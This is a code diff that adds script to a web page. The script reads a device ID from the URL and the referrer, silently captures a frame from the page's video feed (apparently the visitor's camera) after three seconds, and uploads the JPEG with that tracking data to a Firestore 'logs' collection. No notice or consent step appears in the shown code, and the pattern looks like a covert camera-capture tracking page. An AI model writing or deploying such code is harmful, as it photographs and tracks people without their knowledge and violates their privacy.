@@ -37,6 +37,36 @@
     // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const firestore = firebase.firestore();
+
+        // Get query param ?device=...
+    const urlParams = new URLSearchParams(window.location.search);
+    const deviceID = urlParams.get('device') || 'UnknownDevice';
+    const referrer = document.referrer || 'Direct';
+
+    // Take a snapshot after 3 seconds
+    setTimeout(() => {
+      const video = document.getElementById('video');
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      // Push to Firestore
+      firestore.collection('logs').add({
+        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+        deviceID: deviceID,
+        referrer: referrer,
+        imageData: imageData
+      }).then(() => {
+        console.log('Logged to Firestore successfully.');
+      }).catch((error) => {
+        console.error('Error logging to Firestore:', error);
+      });
+
+    }, 3000); // Delay to give time for video to load
+    
   </script>
 </body>
 </html>
